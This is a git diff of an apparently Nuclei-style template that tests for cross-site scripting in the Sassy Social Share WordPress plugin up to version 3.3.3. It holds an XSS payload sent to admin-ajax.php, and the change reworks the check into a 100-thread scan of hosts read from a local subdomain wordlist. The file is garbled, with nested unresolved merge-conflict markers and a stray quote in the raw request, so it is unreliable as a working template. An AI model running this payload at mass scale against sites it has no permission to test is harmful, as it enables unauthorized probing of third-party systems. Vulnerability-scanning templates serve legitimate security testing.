@@ -2,6 +2,7 @@ id: sassy-social-share-xss
 
 info:
 <<<<<<< HEAD
+<<<<<<< HEAD
   name: Sassy Social Share <= 3.3.3 - Cross-Site Scripting
   author: Random_Robbie
   severity: medium
@@ -20,27 +21,34 @@ info:
     cwe-id: CWE-79
   tags: xss,wp,wpscan,wordpress,wp-plugin,sassy
 >>>>>>> 5d36d276 (add new stuff)
+=======
+  name: Sassy Social Share XSS
+  author: Random_Robbie
+  severity: medium
+  description: Sassy Social Share <= 3.3.3 - Cross-Site Scripting (XSS)
+  tags: wordpress,wp-plugin
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]="
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=" HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
     matchers-condition: and
     matchers:
       - type: word
-        part: body
         words:
           - '[{"<img src=x onerror=alert(document.domain)>":""}]'
           - 'facebook'
           - 'twitter'
+        part: body
         condition: and
-
-      - type: word
-        part: header
-        words:
-          - 'application/json'
-        negative: true
 
       - type: status
         status:
